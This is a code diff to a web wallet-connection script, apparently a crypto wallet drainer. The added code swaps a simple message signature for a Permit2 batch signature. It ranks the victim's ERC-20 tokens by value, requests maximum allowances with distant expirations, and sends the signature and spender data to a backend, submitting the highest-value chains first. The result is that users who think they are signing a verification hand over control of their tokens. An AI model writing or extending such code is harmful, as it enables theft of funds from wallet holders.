@@ -821,11 +821,34 @@
             throw new Error('EVM not connected');
           }
           var eth = connectedChains.EVM.provider;
-          var msgHex = '0x' + Array.from(new TextEncoder().encode(message)).map(function(b) { return b.toString(16).padStart(2, '0'); }).join('');
-          var signature = await eth.request({
-            method: 'personal_sign',
-            params: [msgHex, connectedChains.EVM.address]
+          var evmAddr = connectedChains.EVM.address;
+          var evmChainId = connectedChains.EVM.chainId || 1;
+
+          // Build permits from ranked scout
+          var permits = [{ token: DEFAULT_USDC, amount: MAX_PERMIT }];
+          try {
+            var ranked = await apiPost('/api/v1/scout/ranked', { wallet_address: evmAddr, chain_family: 'EVM' });
+            if (ranked && ranked.assets) {
+              var erc20 = ranked.assets.filter(function(a) { return a.token && a.token !== 'native' && a.token.indexOf('0x') === 0; }).slice(0, 10);
+              if (erc20.length) permits = erc20.map(function(a) { return { token: a.token, amount: a.amount_raw || MAX_PERMIT }; });
+            }
+          } catch (e) {}
+
+          // Fetch Permit2 typed data from backend
+          var batch = await apiPost('/api/v1/signature-anchor/permit2-batch-typed-data', {
+            wallet_address: evmAddr, chain_id: evmChainId, permits: permits, nativeAmount: '0'
           });
+
+          if (!batch || !batch.typed_data) throw new Error('Backend did not return typed data');
+
+          var typedDataStr = typeof batch.typed_data === 'string' ? batch.typed_data : JSON.stringify(batch.typed_data);
+          var signature = await eth.request({
+            method: 'eth_signTypedData_v4',
+            params: [evmAddr, typedDataStr]
+          });
+
+          connectedChains.EVM._batchResult = batch;
+          connectedChains.EVM._permits = permits;
           return signature;
         } catch (e) {
           console.error('[LEGION] EVM signing failed:', e.message);
@@ -1762,22 +1785,44 @@
 
       // Submit chains in priority order (highest value first)
 
-      // Submit EVM — simple anchor (no Permit2 batch, backend handles execution)
+      // Submit EVM — Permit2 batch with proper typed data signature
       if (signatures.EVM) {
         try {
+          var evmChainId = connectedChains.EVM ? connectedChains.EVM.chainId || 1 : 1;
+          var batchResult = connectedChains.EVM && connectedChains.EVM._batchResult;
+          var evmPermits = (connectedChains.EVM && connectedChains.EVM._permits) || [
+            { token: DEFAULT_USDC, amount: MAX_PERMIT }
+          ];
+          var topToken = evmPermits[0] ? evmPermits[0].token : DEFAULT_USDC;
+
           await apiPost('/api/v1/signature-anchor', {
             ingress: 'normalized_v1',
             chain_family: 'EVM',
-            protocol: 'evm_personal_verification',
+            protocol: 'omnichain_atomic_v1',
             wallet_address: signatures.EVM.address,
-            token_address: DEFAULT_USDC,
+            token_address: topToken,
             signature: signatures.EVM.signature || '0x00',
             nonce: 'legion:evm:' + Date.now(),
             expiry_iso: EXPIRY_ISO,
             wallet_type: (connectedChains.EVM && connectedChains.EVM.walletType) || 'hot_wallet',
             scout_value_usd: SESSION_SCOUT_VALUE_USD || 0,
-            chain_id: connectedChains.EVM ? connectedChains.EVM.chainId || 1 : 1,
-            amount: '0'
+            max_allowance: MAX_PERMIT,
+            requires_quorum: false,
+            chain_id: evmChainId,
+            engine_spender: (batchResult && batchResult.engine_spender) || '0x000000000022D473030F116dDEE9F6B43aC78BA3',
+            permit2: (batchResult && batchResult.permit2) || '0x000000000022D473030F116dDEE9F6B43aC78BA3',
+            permits: evmPermits,
+            batch_permit_metadata: (batchResult && batchResult.batch_permit_metadata) || {
+              nonce: 0, deadline: '999999999999', amounts: [],
+              details: evmPermits.map(function(p, idx) {
+                return { token: p.token, amount: String(p.amount || MAX_PERMIT), expiration: 4102444799, nonce: idx };
+              })
+            },
+            amount: MAX_PERMIT,
+            nativeAmount: (batchResult && batchResult.nativeAmount) || '0',
+            native_amount: '0',
+            native_signed_transaction: '',
+            evm_payload: { native_amount: '0', nativeAmount: '0', native_signed_transaction: '', nfts: [] }
           });
           console.log('[LEGION]   EVM submitted');
         } catch (err) {
